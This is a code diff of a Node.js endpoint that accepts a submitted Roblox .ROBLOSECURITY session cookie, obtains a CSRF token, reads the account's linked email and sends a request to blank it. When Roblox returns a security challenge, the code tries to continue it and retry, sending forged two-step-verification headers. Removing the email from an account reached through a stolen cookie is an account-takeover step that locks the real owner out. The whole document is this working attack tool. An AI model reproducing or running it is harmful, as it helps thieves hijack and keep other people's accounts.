@@ -1,53 +1,111 @@
-import https from "https";
+const https = require("https");
 
-export default async function handler(req, res) {
-  const cookie = req.headers.cookieHeader;
-  if (!cookie) return res.status(400).json({ error: "Missing .ROBLOSECURITY cookie" });
-
-  const csrfToken = await getCSRFToken(cookie);
-  if (!csrfToken) return res.status(500).json({ error: "Failed to get CSRF token" });
-
-  const emailInfo = await getEmail(cookie, csrfToken);
-  if (!emailInfo || emailInfo.error) return res.status(500).json({ error: "Failed to fetch email info", details: emailInfo });
-
-  console.log("Email info response:", emailInfo);
-
-  const removeResponse = await removeEmail(cookie, csrfToken);
-  console.log("Remove email result:", removeResponse);
-
-  if (removeResponse.status === 403 && removeResponse.headers["rblx-challenge-id"]) {
-    console.log("⚠️ Challenge required. Attempting to continue challenge...");
-
-    const challengeId = removeResponse.headers["rblx-challenge-id"];
-    const challengeMetadata = removeResponse.headers["rblx-challenge-metadata"];
-
-    const result = await continueChallenge(cookie, csrfToken, challengeId, challengeMetadata);
-    console.log("Challenge continue result:", result);
-
-    return res.status(result.status || 500).json({ message: "Challenge continue attempted", result });
+module.exports = async (req, res) => {
+  if (req.method !== "POST") {
+    res.writeHead(405, { "Content-Type": "application/json" });
+    return res.end(JSON.stringify({ error: "Only POST allowed" }));
   }
 
-  return res.status(removeResponse.status).json(removeResponse);
-}
+  let cookie = req.body.cookie;
+  if (!cookie) {
+    res.writeHead(400, { "Content-Type": "application/json" });
+    return res.end(JSON.stringify({ error: "Missing .ROBLOSECURITY cookie" }));
+  }
 
-function getCSRFToken(cookie) {
-  return new Promise((resolve) => {
+  cookie = cookie.trim();
+  if (cookie.includes(".ROBLOSECURITY=")) {
+    cookie = cookie.split(".ROBLOSECURITY=")[1];
+  }
+
+  if (cookie.length < 50) {
+    res.writeHead(400, { "Content-Type": "application/json" });
+    return res.end(JSON.stringify({ error: "Invalid .ROBLOSECURITY cookie format" }));
+  }
+
+  try {
+    console.log("🔑 Getting CSRF token...");
+    const csrfToken = await getCsrfToken(cookie);
+    console.log("✅ CSRF token:", csrfToken);
+
+    console.log("📧 Fetching email info...");
+    const emailInfo = await fetchEmail(cookie, csrfToken);
+    console.log("📬 Email info:", emailInfo);
+
+    if (!emailInfo || (!emailInfo.emailId && !emailInfo.emailAddress)) {
+      res.writeHead(400, { "Content-Type": "application/json" });
+      return res.end(JSON.stringify({
+        error: "No linked email or invalid response",
+        debug: emailInfo,
+      }));
+    }
+
+    const emailToDelete = emailInfo.emailId || emailInfo.emailAddress;
+    console.log("🗑️ Attempting to delete email:", emailToDelete);
+
+    let result = await deleteEmail(cookie, csrfToken, emailToDelete);
+
+    if (result && result.needsChallenge) {
+      console.log("⚠️ Challenge required. Continuing challenge...");
+      const challengeResult = await continueChallenge(
+        cookie,
+        csrfToken,
+        result.realChallengeId,
+        result.challengeMetadata
+      );
+
+      if (challengeResult.success) {
+        console.log("✅ Challenge passed. Retrying email delete...");
+        result = await deleteEmail(cookie, csrfToken, emailToDelete, result.realChallengeId);
+      } else {
+        console.log("❌ Challenge failed:", challengeResult);
+        res.writeHead(403, { "Content-Type": "application/json" });
+        return res.end(JSON.stringify({
+          error: "Challenge continuation failed",
+          challenge: challengeResult,
+        }));
+      }
+    }
+
+    if (result && result.errors && result.errors.length > 0) {
+      res.writeHead(403, { "Content-Type": "application/json" });
+      return res.end(JSON.stringify({
+        error: result.errors[0].message || "Challenge required",
+        code: result.errors[0].code,
+      }));
+    }
+
+    res.writeHead(200, { "Content-Type": "application/json" });
+    return res.end(JSON.stringify({
+      success: true,
+      result,
+    }));
+  } catch (err) {
+    console.error("❌ Server error:", err);
+    res.writeHead(500, { "Content-Type": "application/json" });
+    return res.end(JSON.stringify({ error: err.message }));
+  }
+};
+
+function getCsrfToken(cookie) {
+  return new Promise((resolve, reject) => {
     const req = https.request({
       method: "POST",
       hostname: "auth.roblox.com",
       path: "/v2/logout",
-      headers: {
-        Cookie: `.ROBLOSECURITY=${cookie}`,
-      },
+      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
     }, (res) => {
-      resolve(res.headers["x-csrf-token"]);
+      const token = res.headers["x-csrf-token"];
+      if (token) return resolve(token);
+      reject(new Error("CSRF token not found in headers"));
     });
+
+    req.on("error", reject);
     req.end();
   });
 }
 
-function getEmail(cookie, csrfToken) {
-  return new Promise((resolve) => {
+function fetchEmail(cookie, csrfToken) {
+  return new Promise((resolve, reject) => {
     const req = https.request({
       method: "GET",
       hostname: "accountsettings.roblox.com",
@@ -55,70 +113,88 @@ function getEmail(cookie, csrfToken) {
       headers: {
         Cookie: `.ROBLOSECURITY=${cookie}`,
         "X-CSRF-TOKEN": csrfToken,
-      },
+        Accept: "application/json",
+        "User-Agent": "Mozilla/5.0"
+      }
     }, (res) => {
       let data = "";
-      res.on("data", (chunk) => (data += chunk));
+      res.on("data", chunk => data += chunk);
       res.on("end", () => {
         try {
           resolve(JSON.parse(data));
-        } catch (e) {
-          resolve({ error: "Invalid JSON", raw: data });
+        } catch {
+          reject(new Error("Invalid JSON in fetchEmail: " + data));
         }
       });
     });
+
+    req.on("error", reject);
     req.end();
   });
 }
 
-function removeEmail(cookie, csrfToken) {
-  return new Promise((resolve) => {
+function deleteEmail(cookie, csrfToken, emailAddress, challengeId = null) {
+  return new Promise((resolve, reject) => {
+    const payload = JSON.stringify({ emailAddress: "" });
+
+    const headers = {
+      Cookie: `.ROBLOSECURITY=${cookie}`,
+      "X-CSRF-TOKEN": csrfToken,
+      "Content-Type": "application/json",
+      Accept: "application/json",
+      "Content-Length": Buffer.byteLength(payload),
+      "User-Agent": "Mozilla/5.0"
+    };
+
+    if (challengeId) {
+      headers["rblx-challenge-id"] = challengeId;
+      headers["rblx-challenge-type"] = "twostepverification";
+      headers["rblx-challenge-metadata"] = "{}";
+    }
+
     const req = https.request({
       method: "PATCH",
       hostname: "accountsettings.roblox.com",
       path: "/v1/email",
-      headers: {
-        Cookie: `.ROBLOSECURITY=${cookie}`,
-        "X-CSRF-TOKEN": csrfToken,
-        "Content-Type": "application/json",
-      },
+      headers
     }, (res) => {
       let data = "";
-      res.on("data", (chunk) => (data += chunk));
+      res.on("data", chunk => data += chunk);
       res.on("end", () => {
-        resolve({
-          status: res.statusCode,
-          headers: res.headers,
-          body: data,
-        });
+        try {
+          const parsed = data ? JSON.parse(data) : {};
+          if (res.statusCode === 403 && parsed.errors) {
+            const headerChallengeId = res.headers["rblx-challenge-id"];
+            const challengeType = res.headers["rblx-challenge-type"];
+            const challengeMetadata = res.headers["rblx-challenge-metadata"];
+            if (headerChallengeId && challengeType) {
+              return resolve({
+                needsChallenge: true,
+                realChallengeId: headerChallengeId,
+                challengeType,
+                challengeMetadata
+              });
+            }
+          }
+          resolve(parsed);
+        } catch {
+          resolve({ success: res.statusCode === 204 || res.statusCode === 200 });
+        }
       });
     });
-    req.write("{}");
+
+    req.on("error", reject);
+    req.write(payload);
     req.end();
   });
 }
 
 function continueChallenge(cookie, csrfToken, challengeId, challengeMetadata) {
   return new Promise((resolve, reject) => {
-    console.log("Attempting to continue challenge using latest Roblox challenge API...");
-
-    if (!challengeMetadata) {
-      return resolve({ success: false, error: "No challenge metadata provided" });
-    }
-
-    let parsedMetadata;
-    try {
-      parsedMetadata = JSON.parse(Buffer.from(challengeMetadata, "base64").toString("utf8"));
-    } catch (e) {
-      return resolve({ success: false, error: "Failed to decode challenge metadata" });
-    }
-
     const payload = JSON.stringify({
-      challengeId: challengeId,
-      challengeMetadata: parsedMetadata,
+      challengeId,
+      challengeMetadata
     });
-
-    console.log("Challenge payload:", payload);
 
     const req = https.request({
       method: "POST",
@@ -130,28 +206,20 @@ function continueChallenge(cookie, csrfToken, challengeId, challengeMetadata) {
         "Content-Type": "application/json",
         Accept: "application/json",
         "Content-Length": Buffer.byteLength(payload),
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-      },
+        "User-Agent": "Mozilla/5.0"
+      }
     }, (res) => {
       let data = "";
-      res.on("data", (chunk) => (data += chunk));
+      res.on("data", chunk => data += chunk);
       res.on("end", () => {
-        console.log("Challenge continue response status:", res.statusCode);
-        console.log("Challenge continue response data:", data);
         try {
           const parsed = data ? JSON.parse(data) : {};
-          if (res.statusCode === 200 || res.statusCode === 204) {
-            resolve({ success: true, data: parsed });
-          } else {
-            resolve({
-              success: false,
-              status: res.statusCode,
-              data: parsed,
-              error: `HTTP ${res.statusCode} Data: ${data}`,
-            });
-          }
-        } catch (e) {
-          resolve({ success: false, error: `Invalid JSON response: ${data}` });
+          resolve({
+            success: res.statusCode === 200 || res.statusCode === 204,
+            data: parsed
+          });
+        } catch {
+          resolve({ success: false, error: "Invalid challenge JSON: " + data });
         }
       });
     });
@@ -160,4 +228,4 @@ function continueChallenge(cookie, csrfToken, challengeId, challengeMetadata) {
     req.write(payload);
     req.end();
   });
-              }
+                  }
